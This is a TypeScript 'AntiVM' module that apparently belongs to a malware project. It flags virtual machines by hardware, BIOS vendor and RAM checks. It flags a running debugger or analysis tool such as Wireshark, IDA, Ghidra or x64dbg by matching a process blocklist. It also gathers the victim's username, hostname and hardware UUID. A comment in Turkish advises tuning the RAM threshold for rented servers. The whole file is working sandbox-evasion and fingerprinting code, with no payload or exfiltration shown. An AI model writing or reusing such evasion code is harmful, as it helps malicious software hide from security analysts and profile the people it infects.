import { execSync } from 'child_process';
import os from 'os';

export class AntiVM {
    public static async checkAll(): Promise<boolean> {
        return this.checkHardware() || this.checkAdvancedVM() || await this.checkProcesses();
    }

    private static checkHardware(): boolean {
        const cpus = os.cpus();
        const totalMem = os.totalmem();
        const model = cpus[0].model.toLowerCase();

        // RAM sınırını VDS'ler için 4GB'a çekebilirsin
        const isLowRes = cpus.length < 2 || totalMem < 4294967296;
        const isKnownVM = ['virtual', 'vbox', 'vmware', 'qemu', 'hyper-v', 'xen'].some(name => model.includes(name));

        return isLowRes || isKnownVM;
    }

    private static checkAdvancedVM(): boolean {
        try {
            const biosInfo = execSync('wmic baseboard get manufacturer,product').toString().toLowerCase();
            const sysInfo = execSync('wmic systemenclosure get manufacturer').toString().toLowerCase();

            const vmVendors = ['microsoft corporation', 'vmware', 'oracle', 'xen', 'proxmox', 'amazon ec2', 'google', 'alibaba'];
            return vmVendors.some(vendor => biosInfo.includes(vendor) || sysInfo.includes(vendor));
        } catch (e) {
            return false;
        }
    }

    private static async checkProcesses(): Promise<boolean> {
        return new Promise((resolve) => {
            try {
                const blacklist = [
                    'wireshark', 'tcpdump', 'tshark', 'process monitor', 'procmon', 'procexp',
                    'ollydbg', 'x64dbg', 'x32dbg', 'ida pro', 'ida64', 'ida32', 'immunity',
                    'radare2', 'ghidra', 'binary ninja', 'cheat engine', 'fiddler', 'burp suite',
                    'owasp zap', 'curl.exe', 'resource hacker', 'pestudio', 'cff explorer',
                    'dependency walker', 'hexeditor', 'die', 'process hacker', 'apimonitor',
                    'detours', 'easyhook', 'madchook'
                ];
                const tasks = execSync('tasklist').toString().toLowerCase();
                resolve(blacklist.some(app => tasks.includes(app)));
            } catch (e) {
                resolve(false);
            }
        });
    }
    public static getMachineDetails() {
        return {
            username: os.userInfo().username,
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            cpus: os.cpus()[0].model,
            hwid: execSync('wmic csproduct get uuid').toString().split('\n')[1].trim()
        };
    }
}